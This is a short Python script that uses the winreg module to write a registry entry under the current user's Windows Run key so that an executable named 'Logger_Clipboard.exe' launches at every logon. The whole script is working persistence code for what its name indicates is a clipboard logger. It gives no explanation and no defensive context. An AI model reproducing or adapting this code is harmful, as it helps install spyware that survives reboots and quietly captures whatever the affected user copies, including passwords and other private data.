import winreg
myExe_path = 'C:\\Users\\esd\\Desktop\\Py\\dist\\'
myFile = 'Logger_Clipboard.exe'
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE);
winreg.SetValueEx(key, myFile, 0, winreg.REG_SZ, myExe_path+myFile); 
key.Close()
